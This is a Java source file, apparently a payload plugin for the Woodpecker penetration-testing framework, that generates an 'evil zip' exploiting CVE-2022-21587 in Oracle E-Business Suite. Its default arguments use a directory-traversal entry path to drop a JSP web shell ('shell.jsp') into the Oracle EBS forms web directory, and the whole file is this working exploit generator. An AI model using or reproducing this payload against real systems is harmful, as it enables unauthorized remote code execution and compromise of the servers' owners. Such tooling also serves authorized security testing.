package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class CVE_2022_21587_Payload implements IPayloadGenerator {

    @Override
    public String getPayloadTabCaption() {
        return "EvilZipGenerator";
    }

    @Override
    public IArgsUsageBinder getPayloadCustomArgs() {
        List<IArg> args = new ArrayList<>();
        // localFilePath
        final IArg localFilePath = VulPluginInfo.pluginHelper.createArg();
        localFilePath.setName("localFilePath");
        localFilePath.setDefaultValue("/tmp/shell.jsp");
        localFilePath.setDescription("local File Path");
        localFilePath.setRequired(true);
        localFilePath.setType(IArg.ARG_TYPE_STRING);
        args.add(localFilePath);

        // target uncompress_path
        final IArg unCompressPath = VulPluginInfo.pluginHelper.createArg();
        unCompressPath.setName("unCompressPath");
        unCompressPath.setDefaultValue("../../../../../FMW_Home/Oracle_EBS-app1/applications/forms/forms/shell.jsp");
        unCompressPath.setDescription("unCompress Path");
        unCompressPath.setRequired(true);
        unCompressPath.setType(IArg.ARG_TYPE_STRING);
        args.add(unCompressPath);

        // zipSavePath
        final IArg zipSavePath = VulPluginInfo.pluginHelper.createArg();
        zipSavePath.setName("zipSavePath");
        zipSavePath.setDefaultValue("/tmp/shell.zip");
        zipSavePath.setDescription("evil zip save path");
        zipSavePath.setRequired(true);
        zipSavePath.setType(IArg.ARG_TYPE_STRING);
        args.add(zipSavePath);

        IArgsUsageBinder binder = VulPluginInfo.pluginHelper.createArgsUsageBinder();
        binder.setArgsList(args);
        return binder;
    }

    @Override
    public void generatorPayload(Map<String, Object> customArgs, IResultOutput result) throws Throwable {
        String localFilePath = (String)customArgs.get("localFilePath");
        String unCompressPath = (String)customArgs.get("unCompressPath");
        String zipName = unCompressPath.substring(unCompressPath.lastIndexOf(File.separatorChar) + 1);
        String zipSavePath = System.getProperty("java.io.tmpdir") + zipName;
        String payload = CommonUtils.generateEvilZip(result, unCompressPath, zipName, zipSavePath, localFilePath);
        result.infoPrintln("evil zip content:");
        result.rawPrintln("\n" + payload + "\n");
    }
}
